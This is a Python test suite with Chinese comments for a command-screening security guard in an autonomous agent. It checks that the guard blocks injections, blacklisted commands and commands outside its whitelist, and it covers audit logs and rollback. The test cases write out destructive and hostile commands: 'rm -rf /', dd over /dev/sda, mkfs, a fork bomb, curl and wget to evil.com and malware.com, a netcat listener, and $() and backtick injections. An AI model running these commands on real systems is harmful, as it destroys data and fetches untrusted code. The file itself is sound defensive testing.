"""
阶段3安全护栏测试 — 验证自主执行不危险

测试目标（第一性原理验证）：
1. 命令注入检测（;rm, |sh, $(), ``等）
2. 危险命令黑名单（rm -rf /, mkfs, dd等）
3. 白名单机制（非白名单命令被拒绝）
4. 风险评级（safe/low/medium/high）
5. 审计日志（每次执行有完整记录）
6. 回滚机制（失败时自动回滚）
7. TaskRouter 集成 SecurityGuard
"""

from __future__ import annotations

import os
import sys
import tempfile
from typing import List

import numpy as np

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from safety.security_guard import SecurityGuard, SecurityCheckResult
from core import (
    AgentConfig, TaskStatus, TaskPriority, DriveType,
    STATE_VECTOR_DIM, STATE_IDX_CPU_OVERALL, STATE_IDX_MEM_USED,
)
from core.types import Task


class TestResult:
    def __init__(self):
        self.passed = 0
        self.failed = 0
        self.errors: List[str] = []

    def ok(self, name: str):
        self.passed += 1
        print(f"  [PASS] {name}")

    def fail(self, name: str, reason: str):
        self.failed += 1
        msg = f"{name}: {reason}"
        self.errors.append(msg)
        print(f"  [FAIL] {msg}")

    def summary(self):
        total = self.passed + self.failed
        print(f"\n  通过: {self.passed}, 失败: {self.failed}, 共{total}项")
        for e in self.errors:
            print(f"    - {e}")


# =============================================================================
# 测试1: 命令注入检测
# =============================================================================

def test_injection_detection(result: TestResult):
    print(f"\n  --- 测试1: 命令注入检测 ---")
    guard = SecurityGuard(max_risk_level="high")

    injection_cases = [
        ("ls; rm -rf /", "分号后rm"),
        ("cat file | sh", "管道到sh"),
        ("echo $(rm -rf /)", "命令替换$()"),
        ("echo `rm -rf /`", "反引号替换"),
        ("dd if=/dev/zero of=/dev/sda", "dd写块设备"),
        (":(){ :|:& };:", "fork bomb"),
        ("chmod -R 777 /", "递归777根目录"),
    ]

    for cmd, desc in injection_cases:
        check = guard.check(cmd)
        if not check.allowed:
            result.ok(f"拦截注入: {desc}")
        else:
            result.fail(f"注入未拦截: {desc}", f"命令={cmd} 被放行")


# =============================================================================
# 测试2: 危险命令黑名单
# =============================================================================

def test_blacklist(result: TestResult):
    print(f"\n  --- 测试2: 危险命令黑名单 ---")
    guard = SecurityGuard(max_risk_level="high")

    blacklist_cases = [
        "rm -rf /",
        "rm -rf /*",
        "mkfs.ext4 /dev/sda1",
        "dd if=/dev/zero of=/dev/sda bs=1M",
    ]

    for cmd in blacklist_cases:
        check = guard.check(cmd)
        if not check.allowed:
            result.ok(f"拦截黑名单: {cmd[:30]}")
        else:
            result.fail("黑名单失效", f"命令={cmd} 被放行")


# =============================================================================
# 测试3: 白名单机制 — 非白名单命令被拒绝
# =============================================================================

def test_whitelist(result: TestResult):
    print(f"\n  --- 测试3: 白名单机制 ---")
    guard = SecurityGuard(max_risk_level="high")

    # 白名单内命令应放行
    safe_cases = ["ps aux", "df -h", "free -m", "ls -la", "cat /etc/hostname",
                  "uptime", "systemctl status nginx"]
    for cmd in safe_cases:
        check = guard.check(cmd)
        if check.allowed:
            result.ok(f"放行白名单: {cmd}")
        else:
            result.fail("白名单误拦", f"命令={cmd} 被拦截: {check.reason}")

    # 非白名单命令应拒绝
    non_whitelist_cases = ["curl http://evil.com", "wget http://malware.com",
                           "python -c 'import os; os.system(\"rm -rf /\")'",
                           "nc -l 4444"]
    for cmd in non_whitelist_cases:
        check = guard.check(cmd)
        if not check.allowed:
            result.ok(f"拒绝非白名单: {cmd[:30]}")
        else:
            result.fail("非白名单放行", f"命令={cmd} 被放行")


# =============================================================================
# 测试4: 风险评级
# =============================================================================

def test_risk_assessment(result: TestResult):
    print(f"\n  --- 测试4: 风险评级 ---")
    guard = SecurityGuard(max_risk_level="high")

    cases = [
        ("ps aux", "safe"),
        ("find /tmp -type f -mtime +1 -delete", "low"),  # find在白名单
        ("kill -TERM 12345", "medium"),
    ]

    for cmd, expected_risk in cases:
        check = guard.check(cmd)
        if check.risk_level == expected_risk:
            result.ok(f"风险评级正确: {cmd[:25]} -> {expected_risk}")
        else:
            result.fail("风险评级错误", f"{cmd} 期望{expected_risk} 实际{check.risk_level}")

    # max_risk_level=low 时，medium命令应被拒绝
    guard_low = SecurityGuard(max_risk_level="low")
    check = guard_low.check("kill -TERM 12345")
    if not check.allowed:
        result.ok(f"max_risk=low 时拒绝 medium 命令")
    else:
        result.fail("风险上限失效", "medium命令在low上限下被放行")


# =============================================================================
# 测试5: 审计日志
# =============================================================================

def test_audit_log(result: TestResult):
    print(f"\n  --- 测试5: 审计日志 ---")
    guard = SecurityGuard(max_risk_level="high")

    # 执行几个命令
    guard.safe_execute("ps aux")
    guard.safe_execute("ls /tmp")
    guard.check("rm -rf /")  # 被拦截（不执行）
    guard.safe_execute("df -h")

    log = guard.get_audit_log()
    if len(log) >= 3:
        result.ok(f"审计日志有记录 (len={len(log)})")
    else:
        result.fail("审计日志不足", f"len={len(log)}")

    # 检查审计记录字段
    if log:
        record = log[0]
        required = ["timestamp", "command", "allowed", "executed", "success",
                    "return_code", "duration_ms", "reason"]
        missing = [f for f in required if not hasattr(record, f)]
        if not missing:
            result.ok(f"审计记录字段完整 ({len(required)}个)")
        else:
            result.fail("审计字段缺失", str(missing))

    # 统计
    stats = guard.get_stats()
    if stats["total_checks"] >= 3:
        result.ok(f"统计 total_checks={stats['total_checks']}")
    else:
        result.fail("统计错误", str(stats))


# =============================================================================
# 测试6: 回滚机制
# =============================================================================

def test_rollback(result: TestResult):
    print(f"\n  --- 测试6: 回滚机制 ---")
    guard = SecurityGuard(max_risk_level="high")

    # 执行一个会失败的命令，带回滚命令
    # "ls /nonexistent" 会失败（returncode!=0），回滚命令 "echo rollback_ok"
    success, audit = guard.safe_execute(
        "ls /nonexistent_xyz_12345",
        rollback_command="echo rollback_ok"
    )

    if not success:
        result.ok(f"命令执行失败（如预期）")
    else:
        result.fail("命令意外成功", "")

    if audit.rollback_executed:
        result.ok(f"回滚已执行")
    else:
        result.fail("回滚未执行", "rollback_executed=False")

    if audit.rollback_success:
        result.ok(f"回滚成功")
    else:
        result.fail("回滚失败", "rollback_success=False")


# =============================================================================
# 测试7: TaskRouter 集成 SecurityGuard
# =============================================================================

def test_task_router_security(result: TestResult):
    print(f"\n  --- 测试7: TaskRouter 集成 SecurityGuard ---")
    from execution.task_router import TaskRouter

    router = TaskRouter(dry_run=False)

    # 验证 SecurityGuard 已集成
    if hasattr(router, "security_guard"):
        result.ok(f"TaskRouter 含 security_guard")
    else:
        result.fail("security_guard 缺失", "")

    # 正常任务应通过安全检查
    task = Task(id="t1", name="optimize", action="optimize_resources",
                drive_source=DriveType.SAFETY)
    outcome = router.route(task, None)
    if outcome.success:
        result.ok(f"正常任务通过安全检查")
    else:
        result.fail("正常任务被拦", f"stderr={outcome.stderr}")

    # get_stats 应含 security_stats
    stats = router.get_stats()
    if "security_stats" in stats:
        result.ok(f"get_stats 含 security_stats")
    else:
        result.fail("security_stats 缺失", str(stats.keys()))


# =============================================================================
# 测试8: 安全命令真实执行
# =============================================================================

def test_safe_execution(result: TestResult):
    print(f"\n  --- 测试8: 安全命令真实执行 ---")
    guard = SecurityGuard(max_risk_level="high")

    # ps aux 是安全只读命令，应真实执行成功
    success, audit = guard.safe_execute("ps aux")
    if success:
        result.ok(f"ps aux 执行成功")
    else:
        result.fail("ps aux 失败", f"rc={audit.return_code} reason={audit.reason}")

    if audit.executed:
        result.ok(f"命令真实执行 (executed=True)")
    else:
        result.fail("未真实执行", "executed=False")


# =============================================================================
# 测试9: 空命令处理
# =============================================================================

def test_empty_command(result: TestResult):
    print(f"\n  --- 测试9: 空命令处理 ---")
    guard = SecurityGuard()

    check = guard.check("")
    if not check.allowed:
        result.ok(f"空命令被拒绝")
    else:
        result.fail("空命令放行", "")

    check2 = guard.check("   ")
    if not check2.allowed:
        result.ok(f"空白命令被拒绝")
    else:
        result.fail("空白命令放行", "")


# =============================================================================
# 测试10: Agent 集成 — 安全统计暴露在 get_status
# =============================================================================

def test_agent_security_stats(result: TestResult):
    print(f"\n  --- 测试10: Agent 安全统计 ---")
    from agent import SelfEvolvingAgent
    from memory import ShortTermMemory

    tmp_dir = tempfile.mkdtemp(prefix="p3_status_")
    try:
        config = AgentConfig()
        config.main_loop_interval_ms = 0
        config.execution_dry_run = False
        mem = ShortTermMemory(max_size=50, db_path=os.path.join(tmp_dir, "sec.db"))
        agent = SelfEvolvingAgent(config=config, memory=mem, sensors=[])

        # 执行几个任务
        for action in ["optimize_resources", "increase_sampling_rate"]:
            task = Task(id=f"t_{action}", name=action, action=action,
                        drive_source=DriveType.SAFETY)
            agent.current_state = np.zeros(STATE_VECTOR_DIM, dtype=np.float32)
            agent._execute_task(task)

        status = agent.get_status()
        exec_stats = status.get("execution_stats", {})
        sec_stats = exec_stats.get("security_stats", {})

        if sec_stats:
            result.ok(f"get_status 含 security_stats (total={sec_stats.get('total_checks', 0)})")
        else:
            result.fail("security_stats 缺失", str(exec_stats.keys()))

        agent.stop()
    finally:
        import shutil
        shutil.rmtree(tmp_dir, ignore_errors=True)


def _cleanup_persistent_state():
    """清理测试产生的持久化状态（秩序化阶段1：测试数据隔离）"""
    import glob
    for f in ["./data/memory.db", "./data/goals_state.json"]:
        if os.path.exists(f):
            try:
                os.remove(f)
            except OSError:
                pass
    for pattern in ["./data/skills/*.py", "./data/checkpoints/*.json"]:
        for f in glob.glob(pattern):
            try:
                os.remove(f)
            except OSError:
                pass


def main():
    _cleanup_persistent_state()
    print("\n" + "=" * 60)
    print("  阶段3安全护栏测试 — 自主执行不危险")
    print("=" * 60)

    result = TestResult()
    test_injection_detection(result)
    test_blacklist(result)
    test_whitelist(result)
    test_risk_assessment(result)
    test_audit_log(result)
    test_rollback(result)
    test_task_router_security(result)
    test_safe_execution(result)
    test_empty_command(result)
    test_agent_security_stats(result)

    _cleanup_persistent_state()
    print("\n" + "=" * 60)
    result.summary()
    print("=" * 60)
    return 0 if result.failed == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
